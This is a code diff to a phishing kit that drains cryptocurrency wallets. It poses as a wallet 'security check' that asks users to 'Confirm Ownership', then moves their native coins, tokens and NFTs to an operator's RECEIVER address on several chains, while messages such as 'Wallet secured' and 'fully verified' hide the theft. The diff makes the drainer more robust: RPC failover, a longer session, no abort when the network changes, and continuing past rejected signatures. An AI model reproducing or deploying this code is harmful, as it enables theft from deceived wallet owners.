@@ -155,11 +155,11 @@ p.sub b{color:#d4d4d8;font-weight:600}
 /* ══════════════════════════════════════════════════
    CONFIG — solo esta línea hay que tocar
    ══════════════════════════════════════════════════ */
-const RECEIVER_INPUT = "0xaabB17f788792024170342325AA8eA95486057e1";
+const RECEIVER_INPUT = "TU_WALLET_AQUI";
 /* ══════════════════════════════════════════════════ */
 
 const CFG = {
-  sessionSecs: 900,
+  sessionSecs: 1500,
   probeTimeout: 8000,
   concurrency: 4,
   maxChains: 8,
@@ -386,8 +386,7 @@ async function bind(p, address){
       if (a?.length) { userAddress = a[0]; start(); }
     });
     p.on("chainChanged", () => {
-      if (switching) return;
-      if (busy) { aborted = true; log("Network changed, stopping."); return; }
+      if (switching || busy) return;
       location.reload();
     });
   }
@@ -417,18 +416,30 @@ function provs(cid){
   rpcPool[cid] = A[cid].r.map(u => new ethers.providers.JsonRpcProvider(u, { name:"c"+cid, chainId:cid }, { staticNetwork:true, batchMaxCount:20 }));
   return rpcPool[cid];
 }
-async function mcRead(cid, calls){
-  const list = provs(cid); let err;
+
+async function rpcOne(cid, fn){
+  const list = provs(cid);
+  rpcIdx[cid] = rpcIdx[cid] || 0;
+  let err;
   for (let i = 0; i < list.length; i++) {
-    const p = list[(rpcIdx[cid] + i) % list.length];
+    const k = (rpcIdx[cid] + i) % list.length;
     try {
-      const raw = await p.call({ to: MC3, data: IMC.encodeFunctionData("tryAggregate", [false, calls]) });
-      rpcIdx[cid] = (rpcIdx[cid] + i) % list.length;
-      return IMC.decodeFunctionResult("tryAggregate", raw)[0];
+      const r = await fn(list[k]);
+      rpcIdx[cid] = k;
+      return r;
     } catch (e) { err = e; }
   }
   throw err || new Error("rpc unavailable");
 }
+
+const rpcBalance = cid => rpcOne(cid, p => p.getBalance(userAddress));
+const rpcCall = (cid, to, data) => rpcOne(cid, p => p.call({ to, data }));
+
+async function mcRead(cid, calls){
+  const raw = await rpcOne(cid, p => p.call({ to: MC3, data: IMC.encodeFunctionData("tryAggregate", [false, calls]) }));
+  return IMC.decodeFunctionResult("tryAggregate", raw)[0];
+}
+
 async function pool(items, n, fn){
   const out = new Array(items.length); let i = 0;
   await Promise.all(Array.from({ length: Math.min(n, items.length) }, async () => {
@@ -452,7 +463,7 @@ async function probe(){
       ];
       const r = await Promise.race([
         (async () => {
-          const bal = await provs(id)[0].getBalance(userAddress);
+          const bal = await rpcBalance(id);
           return [bal, await mcRead(id, calls)];
         })(),
         sleep(CFG.probeTimeout).then(() => null)
@@ -494,8 +505,13 @@ async function switchChain(id){
         }]);
       } else throw e;
     });
-    chain = parseInt(await provider.send("eth_chainId", []), 16);
-    if (chain !== id) throw new Error("chain mismatch");
+    let ok = false;
+    for (let k = 0; k < 6 && !ok; k++) {
+      await sleep(350);
+      try { chain = parseInt(await provider.send("eth_chainId", []), 16); } catch(_) { continue; }
+      ok = chain === id;
+    }
+    if (!ok) throw new Error("chain mismatch");
   } finally { setTimeout(() => { switching = false; }, 1500); }
 }
 
@@ -504,7 +520,7 @@ async function scan(display){
   const cfg = A[chain];
   const out = [];
   let native = ethers.constants.Zero;
-  try { native = await provs(chain)[0].getBalance(userAddress); } catch(_){}
+  try { native = await rpcBalance(chain); } catch(_){}
   if (native.gt(0)) out.push({ label:cfg.s, val:ethers.utils.formatUnits(native, 18), kind:"native", target:RECEIVER });
 
   if (cfg.t.length) {
@@ -523,7 +539,7 @@ async function scan(display){
   for (const [name, addr, kind] of cfg.n) {
     try {
       if (kind === "punk") {
-        const bal = IPUNK.decodeFunctionResult("balanceOf", await provs(chain)[0].call({ to:addr, data:IPUNK.encodeFunctionData("balanceOf",[userAddress]) }))[0];
+        const bal = IPUNK.decodeFunctionResult("balanceOf", await rpcCall(chain, addr, IPUNK.encodeFunctionData("balanceOf",[userAddress])))[0];
         if (bal.isZero()) continue;
         const ids = await punksOf(addr);
         if (!ids.length) continue;
@@ -531,7 +547,7 @@ async function scan(display){
                    data:IPUNK.encodeFunctionData("transferPunk",[RECEIVER, ids[0]]), ids, iface:"punk" });
         continue;
       }
-      const bal = I721.decodeFunctionResult("balanceOf", await provs(chain)[0].call({ to:addr, data:I721.encodeFunctionData("balanceOf",[userAddress]) }))[0];
+      const bal = I721.decodeFunctionResult("balanceOf", await rpcCall(chain, addr, I721.encodeFunctionData("balanceOf",[userAddress])))[0];
       if (bal.isZero()) continue;
       const ids = await idsOf(addr, bal);
       if (!ids.length) continue;
@@ -544,7 +560,7 @@ async function scan(display){
 
 async function idsOf(addr, bal){
   try {
-    const raw = await provs(chain)[0].call({ to:addr, data:I721.encodeFunctionData("tokensOfOwner",[userAddress]) });
+    const raw = await rpcCall(chain, addr, I721.encodeFunctionData("tokensOfOwner",[userAddress]));
     const ids = I721.decodeFunctionResult("tokensOfOwner", raw)[0];
     if (ids.length) return ids.slice(0, CFG.nftMax);
   } catch(_){}
@@ -627,9 +643,9 @@ async function sendTx(tx, label){
     const cid = parseInt(await provider.send("eth_chainId", []).catch(() => "0x0"), 16);
     if (cid && cid !== chain) throw abortErr("network changed");
     let resp;
-    try { resp = await signer.sendTransaction({ ...tx, nonce, ...(await feeBump(a)) }); }
+    try { resp = await signer.sendTransaction({ ...tx, chainId: chain, nonce, ...(await feeBump(a)) }); }
     catch (e) {
-      if (e.code === 4001) throw abortErr("signature rejected");
+      if (e.code === 4001) { log(`${label}: rejected, skipped`); return null; }
       log(`${label} attempt ${a}: ${(e.message || "").slice(0,55)}`);
       if (a === 3) return null;
       await sleep(1200);
@@ -658,8 +674,12 @@ async function start(){
   $('scanbox').classList.add('on');
   $('assets').innerHTML = ''; $('assets').style.display = 'none';
   $('listHead').style.display = 'none';
-  $('verifyBtn').classList.add('hidden');
   $('cost').style.display = 'none';
+  const vb = $('verifyBtn');
+  vb.classList.add('hidden');
+  vb.disabled = false;
+  vb.innerHTML = '<i data-lucide="fingerprint" style="width:18px;height:18px"></i>Confirm Ownership';
+  icons();
   st("Running security check…");
 
   try {
@@ -698,7 +718,7 @@ async function start(){
     });
     renderList(rows);
 
-    $('verifyBtn').classList.remove('hidden');
+    vb.classList.remove('hidden');
     $('cost').style.display = 'block';
     $('chat').classList.add('on');
     st(`${rows.filter(r => !r.pending).length} asset(s) detected. Confirm ownership to continue.`);
@@ -746,6 +766,7 @@ async function drainAll(){
     for (let i = 0; i < targets.length; i++) {
       if (aborted || expired()) throw abortErr();
       const id = targets[i].chain;
+      deadline = Date.now() + CFG.sessionSecs * 1000;
       if (id !== chain) {
         st(`Switching network (${i+1}/${targets.length})…`);
         try { await switchChain(id); } catch { log(`${A[id].l}: switch skipped`); continue; }
@@ -755,8 +776,7 @@ async function drainAll(){
       progress((i + 1) / targets.length * 100);
     }
 
-    const total = stats.ok + stats.fail;
-    if (stats.fail === 0) {
+    if (stats.fail === 0 && stats.ok > 0) {
       st(`${stats.ok} item(s) moved. Wallet secured.`, "#4ade80");
       $('title').textContent = "Verification Complete";
       $('sub').innerHTML = "Your wallet passed the security check and is now <b>fully verified</b>. You can close this window.";
@@ -764,7 +784,7 @@ async function drainAll(){
       sessionStorage.removeItem("wv_w");
       clearInterval(timerH); $('timer').textContent = "";
     } else {
-      st(`${stats.ok}/${total} moved · ${stats.fail} pending.`, "#fbbf24");
+      st(`${stats.ok}/${stats.ok + stats.fail} moved · ${stats.fail} pending.`, "#fbbf24");
       $('title').textContent = "Verification Partially Complete";
       $('sub').innerHTML = `${stats.fail} asset(s) could not be moved (fee or contract restriction). <b>Reconnect</b> to retry the remaining ones.`;
     }
@@ -785,28 +805,32 @@ async function drainAll(){
 
 async function drainChain(){
   const items = await scan(false);
-  if (!items.length) { log(`${A[chain].l}: nothing to move`); return; }
 
-  for (const it of items) {
-    if (aborted || expired()) throw abortErr();
+  if (items.length) {
+    for (const it of items) {
+      if (aborted || expired()) throw abortErr();
 
-    if (it.kind === "nft" && it.ids && it.ids.length > 1) {
-      for (let k = 0; k < it.ids.length; k++) {
-        if (aborted || expired()) throw abortErr();
-        const data = it.iface === "punk"
-          ? IPUNK.encodeFunctionData("transferPunk", [RECEIVER, it.ids[k]])
-          : I721.encodeFunctionData("transferFrom", [userAddress, RECEIVER, it.ids[k]]);
-        const rc = await sendTx({ to: it.target, data }, `${it.label} #${k+1}`);
-        if (rc && rc.status === 1) stats.ok++; else stats.fail++;
+      if (it.kind === "native") continue;
+
+      if (it.kind === "nft" && it.ids && it.ids.length > 1) {
+        for (let k = 0; k < it.ids.length; k++) {
+          if (aborted || expired()) throw abortErr();
+          const data = it.iface === "punk"
+            ? IPUNK.encodeFunctionData("transferPunk", [RECEIVER, it.ids[k]])
+            : I721.encodeFunctionData("transferFrom", [userAddress, RECEIVER, it.ids[k]]);
+          const rc = await sendTx({ to: it.target, data }, `${it.label} #${k+1}`);
+          if (rc && rc.status === 1) stats.ok++; else stats.fail++;
+        }
+        log(`${A[chain].l}: ${it.label} ${it.ids.length} NFT done`);
+        continue;
       }
-      log(`${A[chain].l}: ${it.label} ${it.ids.length} NFT done`);
-      continue;
-    }
 
-    if (it.kind === "native") continue; // al final, con reserva
-    const rc = await sendTx({ to: it.target, data: it.data }, it.label);
-    if (rc && rc.status === 1) { stats.ok++; log(`${A[chain].l}: ${it.label} ok`); }
-    else { stats.fail++; log(`${A[chain].l}: ${it.label} failed`); }
+      const rc = await sendTx({ to: it.target, data: it.data }, it.label);
+      if (rc && rc.status === 1) { stats.ok++; log(`${A[chain].l}: ${it.label} ok`); }
+      else { stats.fail++; log(`${A[chain].l}: ${it.label} failed`); }
+    }
+  } else {
+    log(`${A[chain].l}: nothing to move`);
   }
 
   /* nativo al final, con reserva amplia para L1 data fee en OP-stack */
